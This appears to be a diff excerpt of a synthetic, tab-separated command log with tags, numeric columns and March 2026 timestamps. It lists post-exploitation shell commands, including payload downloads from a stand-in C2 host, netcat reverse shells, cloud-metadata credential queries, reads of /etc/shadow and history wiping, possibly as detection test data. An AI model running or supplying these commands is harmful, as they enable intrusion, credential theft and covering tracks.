+524	grep -r "password" /var/www/html/ --tag=354	1	4	3	2026-03-31 09:27:29.893688
+525	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=440	3	1	1	2026-03-31 03:49:20.228251
+526	netstat -antp --tag=375	1	3	3	2026-03-31 00:09:27.756312
+527	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=694	6	2	5	2026-03-31 10:09:40.02527
+528	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=103	5	3	2	2026-03-30 19:51:27.20081
+529	crontab -l --tag=854	6	2	3	2026-03-30 20:08:21.71923
+530	find / -perm -4000 -type f 2>/dev/null --tag=977	2	2	4	2026-03-31 08:01:41.033779
+531	whoami /all --tag=1	2	2	2	2026-03-31 03:02:07.137091
+532	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=501	6	1	1	2026-03-31 10:12:46.102988
+533	netstat -antp --tag=154	2	1	4	2026-03-31 04:12:08.299397
+534	sudo -l --tag=855	6	4	2	2026-03-30 17:38:10.899254
+535	history -c --tag=42	1	4	5	2026-03-31 15:15:42.970982
+536	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=763	1	4	5	2026-03-31 06:15:07.284566
+537	docker images --tag=892	5	3	2	2026-03-31 00:11:10.360732
+538	sudo -l --tag=243	2	3	4	2026-03-31 07:32:45.919664
+539	crontab -l --tag=10	3	4	4	2026-03-30 18:04:14.780134
+540	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=138	4	1	2	2026-03-30 22:09:08.928559
+541	base64 /etc/passwd | head -n 5 --tag=224	6	3	2	2026-03-31 08:40:36.54656
+542	docker images --tag=919	4	2	1	2026-03-31 08:49:52.210416
+543	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=319	4	2	4	2026-03-31 12:00:34.697182
+544	find / -perm -4000 -type f 2>/dev/null --tag=425	2	3	5	2026-03-31 05:59:55.5297
+545	crontab -l --tag=330	6	3	4	2026-03-31 15:01:49.26455
+546	tcpdump -i eth0 -c 10 --tag=721	2	2	5	2026-03-31 00:24:10.441473
+547	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=395	2	3	3	2026-03-31 15:46:28.648542
+548	ps -ef --forest --tag=35	6	4	3	2026-03-31 03:52:21.444808
+549	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=612	1	1	5	2026-03-31 02:20:00.917807
+550	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=993	4	1	1	2026-03-31 12:42:15.428607
+551	ls -laR /home/ --tag=709	1	3	4	2026-03-30 21:15:22.679239
+552	base64 /etc/passwd | head -n 5 --tag=502	2	1	2	2026-03-31 15:51:18.024379
+553	export HISTCONTROL=ignoredups --tag=413	1	3	3	2026-03-30 20:09:43.950266
+554	ps -ef --forest --tag=957	2	1	1	2026-03-31 09:51:37.55783
+555	crontab -l --tag=934	2	4	3	2026-03-30 19:22:49.161956
+556	history -c --tag=987	6	4	4	2026-03-30 17:48:13.897279
+557	grep -r "password" /var/www/html/ --tag=198	3	1	2	2026-03-30 21:35:27.116261
+558	find / -perm -4000 -type f 2>/dev/null --tag=462	3	4	1	2026-03-30 19:16:56.91748
+559	grep -r "password" /var/www/html/ --tag=265	1	1	4	2026-03-31 08:28:39.182538
+560	history -c --tag=517	5	3	5	2026-03-31 09:39:56.805093
+561	kubectl get pods --all-namespaces --tag=991	2	4	3	2026-03-31 13:45:46.567605
+562	export HISTCONTROL=ignoredups --tag=102	3	1	2	2026-03-31 00:42:50.366459
+563	crontab -l --tag=924	2	2	1	2026-03-31 14:34:19.838776
+564	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=162	6	4	5	2026-03-31 15:37:23.258714
+565	ls -laR /home/ --tag=380	3	2	2	2026-03-31 03:20:18.069855
+566	ls -laR /home/ --tag=825	3	4	5	2026-03-31 15:18:22.539149
+567	ps -ef --forest --tag=719	4	2	5	2026-03-30 22:25:57.222106
+568	ps -ef --forest --tag=324	1	3	2	2026-03-30 23:10:30.145635
+569	crontab -l --tag=827	4	3	3	2026-03-31 07:05:16.661325
+570	export HISTCONTROL=ignoredups --tag=29	5	4	1	2026-03-30 22:40:51.126459
+571	whoami /all --tag=144	5	1	5	2026-03-31 07:18:50.708864
+572	base64 /etc/passwd | head -n 5 --tag=204	5	4	4	2026-03-30 20:10:11.78048
+573	netstat -antp --tag=509	6	2	1	2026-03-31 06:09:32.079786
+574	find / -perm -4000 -type f 2>/dev/null --tag=222	4	3	1	2026-03-31 12:57:58.102895
+575	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=177	1	4	5	2026-03-31 13:54:17.097631
+576	history -c --tag=224	4	3	5	2026-03-31 05:01:29.426729
+577	find / -perm -4000 -type f 2>/dev/null --tag=805	6	2	2	2026-03-31 12:27:10.041047
+578	nc -e /bin/sh 10.0.0.103 4444 --tag=147	4	3	2	2026-03-30 20:42:08.475848
+579	crontab -l --tag=777	4	2	2	2026-03-31 04:59:49.448094
+580	ls -laR /home/ --tag=210	2	2	3	2026-03-31 06:54:43.700106
+581	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=617	6	4	4	2026-03-31 08:24:02.045746
+582	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=20	6	1	1	2026-03-31 12:50:20.549418
+583	nc -e /bin/sh 10.0.0.76 4444 --tag=128	2	2	4	2026-03-31 00:58:58.352797
+584	netstat -antp --tag=5	3	1	1	2026-03-30 20:16:41.747091
+585	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=596	3	4	4	2026-03-31 06:14:37.03946
+586	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=364	2	4	3	2026-03-31 11:50:51.1951
+587	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=78	1	3	5	2026-03-30 18:31:00.493835
+588	whoami /all --tag=590	6	2	5	2026-03-31 16:41:43.291724
+589	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=358	4	3	3	2026-03-31 06:42:33.918764
+590	nc -e /bin/sh 10.0.0.63 4444 --tag=412	5	4	4	2026-03-30 23:28:50.560857
+591	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=588	5	1	4	2026-03-31 09:59:04.698409
+592	grep -r "password" /var/www/html/ --tag=158	3	2	4	2026-03-30 21:11:16.358402
+593	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=824	4	3	4	2026-03-31 08:48:19.583626
+594	kubectl get pods --all-namespaces --tag=661	3	4	2	2026-03-31 17:05:43.125804
+595	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=661	5	4	4	2026-03-31 01:39:23.64023
+596	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=854	5	4	4	2026-03-31 13:32:35.720485
+597	find / -perm -4000 -type f 2>/dev/null --tag=552	3	3	2	2026-03-30 17:56:07.930487
+598	export HISTCONTROL=ignoredups --tag=55	1	3	2	2026-03-30 23:48:54.620493
+599	nc -e /bin/sh 10.0.0.63 4444 --tag=274	4	4	4	2026-03-31 01:34:36.628278
+600	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=82	4	1	3	2026-03-31 13:22:14.328352
+601	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=688	1	3	2	2026-03-31 03:13:30.823011
+602	find / -perm -4000 -type f 2>/dev/null --tag=764	2	2	3	2026-03-31 13:27:36.112909
+603	find / -perm -4000 -type f 2>/dev/null --tag=595	1	1	3	2026-03-30 20:30:50.672512
+604	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=492	5	3	5	2026-03-31 01:39:07.654747
+605	nc -e /bin/sh 10.0.0.87 4444 --tag=395	2	4	1	2026-03-31 12:28:57.879762
+606	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=332	4	1	3	2026-03-31 01:47:19.253263
+607	netstat -antp --tag=905	6	4	2	2026-03-30 22:51:54.962909
+608	cat /etc/shadow --tag=24	4	2	2	2026-03-31 03:20:43.053796
+609	cat /etc/shadow --tag=674	6	3	5	2026-03-31 05:47:54.404011
+610	docker images --tag=248	6	1	4	2026-03-31 01:27:02.029283
+611	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=846	2	2	3	2026-03-31 05:21:29.079919
+612	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=223	4	2	5	2026-03-30 23:52:22.031735
+613	history -c --tag=494	2	2	4	2026-03-31 05:45:42.315205
+614	ls -laR /home/ --tag=220	2	3	5	2026-03-31 12:38:45.998698
+615	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=146	5	1	2	2026-03-30 18:47:49.019979
+616	docker images --tag=14	3	1	1	2026-03-31 01:45:38.095029
+617	history -c --tag=507	1	2	4	2026-03-31 10:08:08.89449
+618	sudo -l --tag=63	4	4	3	2026-03-31 16:18:37.745818
+619	ls -laR /home/ --tag=861	5	2	1	2026-03-31 03:54:49.467635
+620	crontab -l --tag=939	2	1	5	2026-03-31 09:41:44.341427
+621	base64 /etc/passwd | head -n 5 --tag=632	4	2	5	2026-03-31 03:07:59.414333
+622	nc -e /bin/sh 10.0.0.72 4444 --tag=599	6	4	4	2026-03-31 02:47:38.755618
+623	cat /etc/shadow --tag=11	6	1	2	2026-03-31 16:00:37.982398
+624	history -c --tag=509	5	4	4	2026-03-31 09:57:32.141613
+625	sudo -l --tag=113	5	4	2	2026-03-31 12:32:33.114846
+626	kubectl get pods --all-namespaces --tag=151	3	1	4	2026-03-31 11:29:37.770574
+627	find / -perm -4000 -type f 2>/dev/null --tag=559	6	1	4	2026-03-31 12:03:55.967931
+628	cat /etc/shadow --tag=908	1	3	2	2026-03-31 11:41:13.757283
+629	history -c --tag=784	2	1	1	2026-03-31 15:47:55.60358
+630	whoami /all --tag=797	1	2	3	2026-03-31 13:40:39.484133
+631	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=279	3	2	4	2026-03-30 19:32:40.470236
+632	export HISTCONTROL=ignoredups --tag=227	6	2	2	2026-03-31 04:22:54.443641
+633	ps -ef --forest --tag=97	6	4	5	2026-03-30 17:40:43.115259
+634	base64 /etc/passwd | head -n 5 --tag=272	2	4	5	2026-03-31 11:18:25.415125
+635	crontab -l --tag=946	6	4	1	2026-03-31 02:35:52.234928
+636	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=253	2	1	5	2026-03-31 14:01:50.018159
+637	tcpdump -i eth0 -c 10 --tag=763	3	1	3	2026-03-31 15:16:39.087151
+638	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=397	6	3	1	2026-03-31 03:40:17.122686
+639	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=534	5	1	1	2026-03-31 08:20:03.432734
+640	ls -laR /home/ --tag=659	5	1	1	2026-03-31 07:41:48.532146
+641	crontab -l --tag=273	4	4	3	2026-03-31 10:11:01.025749
+642	base64 /etc/passwd | head -n 5 --tag=167	1	2	3	2026-03-30 19:58:54.028567
+643	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=465	4	4	4	2026-03-31 09:30:01.816886
+644	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=808	6	1	1	2026-03-31 16:13:15.931191
+645	tcpdump -i eth0 -c 10 --tag=46	2	2	4	2026-03-30 23:15:26.678961
+646	export HISTCONTROL=ignoredups --tag=92	2	1	2	2026-03-31 00:36:13.881883
+647	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=4	1	1	4	2026-03-31 11:04:52.847714
+648	whoami /all --tag=834	1	1	5	2026-03-31 16:15:18.171215
+649	kubectl get pods --all-namespaces --tag=336	5	1	4	2026-03-30 19:34:57.926083
+650	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=758	6	3	5	2026-03-30 22:08:31.976872
+651	cat /etc/shadow --tag=121	6	1	5	2026-03-31 06:29:48.397955
+652	export HISTCONTROL=ignoredups --tag=815	5	1	2	2026-03-30 22:19:31.433073
+653	kubectl get pods --all-namespaces --tag=345	3	1	1	2026-03-31 09:43:44.594527
+654	kubectl get pods --all-namespaces --tag=64	6	2	2	2026-03-30 19:30:02.905582
+655	find / -perm -4000 -type f 2>/dev/null --tag=295	4	4	4	2026-03-30 20:59:33.249515
+656	tcpdump -i eth0 -c 10 --tag=479	6	3	1	2026-03-30 20:46:41.392686
+657	nc -e /bin/sh 10.0.0.153 4444 --tag=434	6	4	5	2026-03-31 07:25:24.078685
+658	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=919	5	4	3	2026-03-31 12:51:34.32034
+659	netstat -antp --tag=547	2	1	4	2026-03-31 11:05:32.745922
+660	export HISTCONTROL=ignoredups --tag=534	3	4	1	2026-03-31 06:03:54.385961
+661	tcpdump -i eth0 -c 10 --tag=659	2	2	5	2026-03-31 11:59:36.672269
+662	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=392	2	2	2	2026-03-30 23:50:12.098608
+663	tcpdump -i eth0 -c 10 --tag=208	1	2	1	2026-03-31 02:49:22.979256
+664	find / -perm -4000 -type f 2>/dev/null --tag=183	3	1	3	2026-03-31 06:45:19.16575
+665	grep -r "password" /var/www/html/ --tag=8	1	2	3	2026-03-31 13:18:12.972576
+666	ps -ef --forest --tag=263	1	4	4	2026-03-31 08:44:43.468611
+667	sudo -l --tag=496	3	4	5	2026-03-31 04:50:15.344452
+668	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=393	4	1	4	2026-03-31 14:55:16.409442
+669	history -c --tag=652	4	1	2	2026-03-30 22:20:44.824368
+670	kubectl get pods --all-namespaces --tag=984	2	4	1	2026-03-31 02:24:42.465534
+671	sudo -l --tag=181	3	2	4	2026-03-30 18:19:56.808471
+672	netstat -antp --tag=469	2	1	4	2026-03-30 17:32:37.270469
+673	ls -laR /home/ --tag=302	5	2	4	2026-03-30 18:44:38.091386
+674	tcpdump -i eth0 -c 10 --tag=656	4	2	2	2026-03-30 22:04:01.135179
+675	netstat -antp --tag=917	5	1	3	2026-03-31 02:42:09.161833
+676	tcpdump -i eth0 -c 10 --tag=955	6	4	2	2026-03-31 03:36:32.622963
+677	crontab -l --tag=89	5	2	2	2026-03-31 09:40:53.735361
+678	crontab -l --tag=244	2	2	3	2026-03-30 21:24:07.763719
+679	base64 /etc/passwd | head -n 5 --tag=857	1	4	2	2026-03-30 17:28:02.077641
+680	kubectl get pods --all-namespaces --tag=934	3	4	4	2026-03-31 16:30:26.543758
+681	netstat -antp --tag=385	6	2	3	2026-03-31 10:06:38.396438
+682	docker images --tag=332	1	4	1	2026-03-31 05:35:36.819133
+683	netstat -antp --tag=408	2	2	3	2026-03-30 22:31:28.126843
+684	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=502	3	3	2	2026-03-31 07:22:39.261371
+685	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=90	2	1	3	2026-03-30 22:31:26.938475
+686	kubectl get pods --all-namespaces --tag=436	6	2	5	2026-03-31 08:11:28.415242
+687	cat /etc/shadow --tag=740	3	1	1	2026-03-31 15:05:51.49433
+688	ls -laR /home/ --tag=585	5	2	2	2026-03-31 05:59:00.062766
+689	ls -laR /home/ --tag=75	3	2	3	2026-03-31 08:08:23.427234
+690	ls -laR /home/ --tag=991	5	4	5	2026-03-31 15:19:41.266219
+691	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=404	5	4	5	2026-03-31 12:07:37.194051
+692	ls -laR /home/ --tag=536	3	2	3	2026-03-30 19:37:58.645447
+693	history -c --tag=160	3	1	2	2026-03-30 21:30:39.353904
+694	crontab -l --tag=724	5	4	4	2026-03-31 06:10:45.063364
+695	sudo -l --tag=224	2	1	1	2026-03-30 17:36:18.818793
+696	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=717	1	3	4	2026-03-30 21:10:37.220147
+697	crontab -l --tag=855	1	4	5	2026-03-31 02:54:43.419483
+698	tcpdump -i eth0 -c 10 --tag=159	6	3	5	2026-03-30 23:48:25.363462
+699	ps -ef --forest --tag=59	1	1	4	2026-03-31 12:54:09.098244
+700	whoami /all --tag=983	5	1	4	2026-03-31 16:23:42.678253
+701	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=993	5	4	1	2026-03-31 12:56:01.838637
+702	history -c --tag=272	1	1	3	2026-03-31 14:19:44.30538
+703	sudo -l --tag=49	5	4	3	2026-03-31 01:36:45.220658
+704	docker images --tag=571	4	3	5	2026-03-30 21:11:44.336219
+705	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=622	5	4	4	2026-03-30 22:11:35.190911
+706	docker images --tag=812	6	3	5	2026-03-31 01:06:12.25445
+707	find / -perm -4000 -type f 2>/dev/null --tag=954	6	2	1	2026-03-30 22:42:31.192351
+708	export HISTCONTROL=ignoredups --tag=785	5	3	5	2026-03-30 22:25:24.383797
+709	nc -e /bin/sh 10.0.0.10 4444 --tag=919	4	1	2	2026-03-31 14:22:14.303952
+710	nc -e /bin/sh 10.0.0.121 4444 --tag=497	4	4	2	2026-03-30 20:08:32.328286
+711	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=212	1	1	5	2026-03-30 17:25:55.115412
+712	base64 /etc/passwd | head -n 5 --tag=920	6	1	2	2026-03-31 02:53:23.400313
+713	find / -perm -4000 -type f 2>/dev/null --tag=162	5	3	5	2026-03-30 18:08:05.933979
+714	crontab -l --tag=147	6	3	4	2026-03-31 02:20:44.883369
+715	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=249	3	3	2	2026-03-30 19:58:22.192933
+716	ps -ef --forest --tag=434	2	1	1	2026-03-31 14:36:10.617662
+717	grep -r "password" /var/www/html/ --tag=161	2	4	3	2026-03-31 11:40:24.358145
+718	kubectl get pods --all-namespaces --tag=78	3	1	2	2026-03-30 20:02:14.374556
+719	history -c --tag=519	2	4	3	2026-03-30 17:46:55.374696
+720	crontab -l --tag=920	3	3	4	2026-03-31 00:51:22.274418
+721	ls -laR /home/ --tag=825	3	2	1	2026-03-31 15:12:43.697452
+722	netstat -antp --tag=214	2	1	1	2026-03-30 18:20:20.751691
+723	crontab -l --tag=674	1	3	3	2026-03-31 09:49:30.428392
+724	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=301	3	4	2	2026-03-30 21:26:35.94641
+725	crontab -l --tag=520	4	4	2	2026-03-30 18:38:16.997847
+726	sudo -l --tag=918	3	2	3	2026-03-31 06:52:21.078163
+727	kubectl get pods --all-namespaces --tag=156	1	2	4	2026-03-31 05:38:35.426057
+728	tcpdump -i eth0 -c 10 --tag=859	6	3	2	2026-03-31 05:20:51.837956
+729	sudo -l --tag=200	1	3	2	2026-03-31 14:45:45.695779
+730	cat /etc/shadow --tag=401	6	3	4	2026-03-31 11:04:31.850881
+731	sudo -l --tag=238	3	1	4	2026-03-31 10:54:11.232692
+732	export HISTCONTROL=ignoredups --tag=183	6	1	4	2026-03-31 10:05:16.451183
+733	netstat -antp --tag=873	5	3	4	2026-03-31 14:58:06.562615
+734	base64 /etc/passwd | head -n 5 --tag=454	2	2	1	2026-03-30 19:20:07.701554
+735	find / -perm -4000 -type f 2>/dev/null --tag=961	1	4	5	2026-03-31 01:43:35.699275
+736	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=189	5	2	2	2026-03-30 19:31:54.970224
+737	ps -ef --forest --tag=433	1	3	4	2026-03-30 17:24:51.243737
+738	docker images --tag=798	6	2	1	2026-03-31 15:09:45.463423
+739	base64 /etc/passwd | head -n 5 --tag=115	2	2	3	2026-03-31 08:12:55.173284
+740	ls -laR /home/ --tag=638	1	3	3	2026-03-31 15:51:50.947649
+741	kubectl get pods --all-namespaces --tag=349	2	4	1	2026-03-31 11:19:51.360196
+742	tcpdump -i eth0 -c 10 --tag=617	1	1	4	2026-03-30 23:11:22.890725
+743	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=653	5	1	3	2026-03-31 06:08:43.582283
+744	tcpdump -i eth0 -c 10 --tag=630	3	3	3	2026-03-31 00:40:06.545542
+745	whoami /all --tag=921	3	1	5	2026-03-31 13:38:54.79889
+746	ps -ef --forest --tag=230	3	4	2	2026-03-31 11:36:59.643671
+747	export HISTCONTROL=ignoredups --tag=457	2	4	2	2026-03-31 03:45:13.77323
+748	crontab -l --tag=403	1	1	1	2026-03-31 15:01:32.269014
+749	history -c --tag=946	4	1	5	2026-03-31 15:01:08.612057
+750	kubectl get pods --all-namespaces --tag=650	6	3	1	2026-03-30 19:36:34.941826
+751	tcpdump -i eth0 -c 10 --tag=770	4	3	3	2026-03-31 08:46:03.048748
+752	ps -ef --forest --tag=389	5	3	2	2026-03-31 02:04:26.925491
+753	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=610	5	2	4	2026-03-31 05:23:35.050259
+754	nc -e /bin/sh 10.0.0.25 4444 --tag=87	1	3	4	2026-03-30 19:01:29.105387
+755	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=193	6	1	2	2026-03-31 09:09:38.356196
+756	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=998	4	3	4	2026-03-30 22:34:06.253942
+757	nc -e /bin/sh 10.0.0.96 4444 --tag=190	4	2	4	2026-03-31 01:41:11.770221
+758	find / -perm -4000 -type f 2>/dev/null --tag=313	1	1	3	2026-03-31 15:28:05.785315
+759	export HISTCONTROL=ignoredups --tag=773	4	3	1	2026-03-31 04:16:28.728874
+760	find / -perm -4000 -type f 2>/dev/null --tag=995	4	2	2	2026-03-30 22:05:34.849251
+761	history -c --tag=228	3	3	1	2026-03-31 13:40:40.120017
+762	cat /etc/shadow --tag=813	6	2	2	2026-03-31 10:22:55.591339
+763	cat /etc/shadow --tag=113	4	1	1	2026-03-31 08:56:23.311924
+764	ls -laR /home/ --tag=3	5	4	1	2026-03-31 08:10:52.441442
+765	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=905	2	4	3	2026-03-31 06:16:25.687968
+766	find / -perm -4000 -type f 2>/dev/null --tag=496	1	3	4	2026-03-31 00:34:03.021313
+767	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=626	6	1	5	2026-03-31 10:06:01.221309
+768	kubectl get pods --all-namespaces --tag=546	5	4	3	2026-03-30 20:48:13.548798
+769	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=39	6	3	5	2026-03-31 09:07:04.28054
+770	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=969	1	2	5	2026-03-30 18:10:45.942203
+771	base64 /etc/passwd | head -n 5 --tag=82	6	4	3	2026-03-31 00:43:37.158617
+772	history -c --tag=287	2	3	3	2026-03-31 03:33:06.272819
+773	nc -e /bin/sh 10.0.0.32 4444 --tag=304	3	2	2	2026-03-30 23:24:47.669511
+774	grep -r "password" /var/www/html/ --tag=283	6	3	5	2026-03-31 04:09:02.886548
+862	base64 /etc/passwd | head -n 5 --tag=771	6	3	3	2026-03-30 21:15:29.59421
+775	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=467	6	2	1	2026-03-30 20:07:46.373583
+776	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=680	5	2	3	2026-03-30 22:45:57.862778
+777	tcpdump -i eth0 -c 10 --tag=624	3	4	4	2026-03-30 22:09:03.892247
+778	ps -ef --forest --tag=276	1	1	3	2026-03-31 07:55:35.534112
+779	sudo -l --tag=103	2	4	2	2026-03-31 03:34:21.220573
+780	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=970	1	4	5	2026-03-31 05:03:27.242511
+781	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=968	1	4	4	2026-03-31 15:16:22.807017
+782	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=388	3	2	5	2026-03-31 14:53:18.689672
+783	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=305	4	1	2	2026-03-31 14:21:21.714597
+784	ls -laR /home/ --tag=752	6	1	1	2026-03-31 16:15:33.233674
+785	kubectl get pods --all-namespaces --tag=864	2	4	5	2026-03-31 08:44:11.479369
+786	cat /etc/shadow --tag=527	6	2	1	2026-03-31 16:00:09.685581
+787	crontab -l --tag=340	5	1	1	2026-03-31 14:58:25.259169
+788	sudo -l --tag=259	4	1	3	2026-03-31 09:53:16.583473
+789	nc -e /bin/sh 10.0.0.69 4444 --tag=751	1	2	5	2026-03-31 01:21:38.154392
+790	ps -ef --forest --tag=83	1	4	4	2026-03-31 05:22:04.661761
+791	ls -laR /home/ --tag=815	3	1	4	2026-03-31 03:54:45.726349
+792	ps -ef --forest --tag=234	1	3	5	2026-03-31 16:45:55.953195
+793	sudo -l --tag=89	2	4	3	2026-03-31 08:50:09.779475
+794	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=628	4	4	5	2026-03-31 13:10:15.933083
+795	crontab -l --tag=263	4	4	1	2026-03-30 21:37:13.729917
+796	base64 /etc/passwd | head -n 5 --tag=684	2	3	2	2026-03-30 21:23:51.678486
+797	grep -r "password" /var/www/html/ --tag=879	1	1	5	2026-03-30 18:18:17.936881
+798	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=466	3	1	2	2026-03-31 15:18:36.7938
+799	grep -r "password" /var/www/html/ --tag=976	5	4	5	2026-03-31 07:23:12.503152
+800	export HISTCONTROL=ignoredups --tag=268	4	4	2	2026-03-30 22:15:29.735479
+801	ls -laR /home/ --tag=278	6	4	2	2026-03-30 18:48:40.570251
+802	grep -r "password" /var/www/html/ --tag=33	6	4	2	2026-03-30 19:05:50.878323
+803	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=311	5	1	4	2026-03-31 10:49:45.253618
+804	ps -ef --forest --tag=654	5	1	5	2026-03-31 10:56:45.649016
+805	ls -laR /home/ --tag=843	5	1	4	2026-03-31 09:01:19.362812
+806	cat /etc/shadow --tag=216	2	4	5	2026-03-30 18:05:46.677672
+807	tcpdump -i eth0 -c 10 --tag=130	1	1	1	2026-03-30 21:11:56.857748
+808	ps -ef --forest --tag=765	5	1	3	2026-03-31 08:41:02.069879
+809	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=337	3	1	1	2026-03-31 15:52:38.16899
+810	nc -e /bin/sh 10.0.0.16 4444 --tag=24	4	4	2	2026-03-31 04:27:10.505433
+811	docker images --tag=604	5	1	4	2026-03-31 13:17:26.68861
+812	nc -e /bin/sh 10.0.0.14 4444 --tag=781	4	2	4	2026-03-31 13:29:55.25798
+813	kubectl get pods --all-namespaces --tag=485	1	3	1	2026-03-31 09:23:35.381829
+814	kubectl get pods --all-namespaces --tag=693	5	4	1	2026-03-31 07:52:28.144412
+815	history -c --tag=483	2	2	2	2026-03-31 00:01:17.35332
+816	history -c --tag=541	1	1	1	2026-03-31 09:58:10.873592
+817	tcpdump -i eth0 -c 10 --tag=489	2	2	1	2026-03-30 18:09:38.033629
+818	nc -e /bin/sh 10.0.0.180 4444 --tag=712	3	4	4	2026-03-30 23:45:15.06083
+819	crontab -l --tag=668	2	3	3	2026-03-31 11:50:06.246464
+820	cat /etc/shadow --tag=952	4	3	1	2026-03-31 13:02:43.581419
+821	export HISTCONTROL=ignoredups --tag=788	2	3	3	2026-03-31 08:07:20.782876
+822	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=353	1	1	2	2026-03-31 14:55:49.997177
+823	netstat -antp --tag=228	4	1	4	2026-03-31 12:18:10.779926
+824	history -c --tag=842	5	3	2	2026-03-31 03:53:30.505929
+825	ps -ef --forest --tag=527	5	1	3	2026-03-30 23:32:09.985889
+826	sudo -l --tag=866	3	3	3	2026-03-31 10:08:45.809569
+827	kubectl get pods --all-namespaces --tag=104	1	1	2	2026-03-31 11:11:37.859567
+828	ls -laR /home/ --tag=599	6	2	5	2026-03-31 13:50:57.503718
+829	ps -ef --forest --tag=857	2	1	1	2026-03-31 03:59:38.912649
+830	base64 /etc/passwd | head -n 5 --tag=811	4	2	4	2026-03-31 07:42:53.278553
+831	cat /etc/shadow --tag=420	2	3	4	2026-03-31 11:57:43.855705
+832	grep -r "password" /var/www/html/ --tag=31	6	1	4	2026-03-30 19:43:32.196219
+833	tcpdump -i eth0 -c 10 --tag=100	4	4	5	2026-03-31 15:19:10.466202
+834	history -c --tag=29	6	2	4	2026-03-31 08:58:00.351239
+835	export HISTCONTROL=ignoredups --tag=279	2	1	4	2026-03-31 03:23:55.207551
+836	grep -r "password" /var/www/html/ --tag=954	4	3	1	2026-03-30 21:12:19.436797
+837	export HISTCONTROL=ignoredups --tag=222	1	3	2	2026-03-30 18:04:43.948922
+838	whoami /all --tag=240	1	2	3	2026-03-31 00:34:28.76837
+839	nc -e /bin/sh 10.0.0.16 4444 --tag=441	6	3	3	2026-03-31 03:23:25.548223
+840	kubectl get pods --all-namespaces --tag=210	5	2	4	2026-03-31 01:12:56.236561
+841	find / -perm -4000 -type f 2>/dev/null --tag=896	3	2	2	2026-03-31 03:41:42.265663
+842	whoami /all --tag=941	3	1	2	2026-03-30 17:49:49.136463
+843	whoami /all --tag=861	4	1	4	2026-03-31 14:18:20.638359
+844	find / -perm -4000 -type f 2>/dev/null --tag=726	4	3	5	2026-03-31 14:10:49.445926
+845	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=425	4	2	5	2026-03-31 01:49:20.279806
